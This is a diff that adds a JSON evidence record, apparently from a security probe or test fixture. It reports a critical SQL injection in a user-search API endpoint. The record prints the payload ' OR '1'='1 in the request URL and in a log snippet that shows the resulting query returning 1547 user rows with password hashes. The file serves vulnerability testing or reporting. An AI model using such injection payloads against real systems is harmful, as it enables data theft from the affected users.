@@ -1,0 +1,24 @@
+{
+  "probe_id": "S_I_03",
+  "timestamp": "2026-06-26T01:23:36.886004",
+  "evidence": {
+    "vulnerability_type": "sql_injection",
+    "severity": "critical",
+    "affected_endpoint": "/api/users/search",
+    "exploit_payload": {
+      "url": "/api/users/search?q=' OR '1'='1",
+      "method": "GET"
+    },
+    "leaked_records": 1547,
+    "leaked_data_types": [
+      "user_id",
+      "username",
+      "password_hash",
+      "email",
+      "phone"
+    ],
+    "affected_components": "用户搜索API",
+    "affected_users": "全部1547名用户"
+  },
+  "log_snippet": "[2026-06-25 14:20:15] GET /api/users/search?q=' OR '1'='1\n[2026-06-25 14:20:15] Executing: SELECT * FROM users WHERE name LIKE '%' OR '1'='1%'\n[2026-06-25 14:20:16] Returned 1547 rows (CRITICAL!)\n[2026-06-25 14:20:16] Response includes password hashes"
+}
